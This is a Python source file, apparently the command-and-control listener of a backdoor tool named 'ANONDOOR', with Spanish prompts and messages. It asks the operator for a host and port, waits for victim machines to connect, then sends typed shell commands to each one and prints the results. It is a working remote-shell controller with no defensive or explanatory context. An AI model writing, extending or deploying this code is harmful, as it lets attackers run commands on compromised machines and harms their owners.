import socket
import subprocess
import sys


def conexion():
    servidor = socket.socket()
    servidor.bind((HOST, PORT))
    servidor.listen(5)
    print(f"Escuchando {HOST}:{PORT}")
    while True:

        cliente, aceptado = servidor.accept()
        print(f'{aceptado[0]}:{aceptado[1]} se ha conectado')
        while True:
            try:
                comando = input("$: ")
                if comando.lower() == "exit":
                    break
                if len(comando) > 0:    
                    cliente.send(bytes(comando.encode()))
                    recibido = cliente.recv(1024).decode()
                    print(recibido)
            except KeyboardInterrupt:
                print("\nConexion cerrada")
                cliente.close()
                servidor.close()
                sys.exit()

if __name__ == "__main__":
    print("Intentas ejecutar esto Fuera de ANONDOOR?")
else:
    HOST = str(input("Ingresa tu HOST: "))
    PORT = int(input("Ingresa tu PORT: "))
    conexion()
    



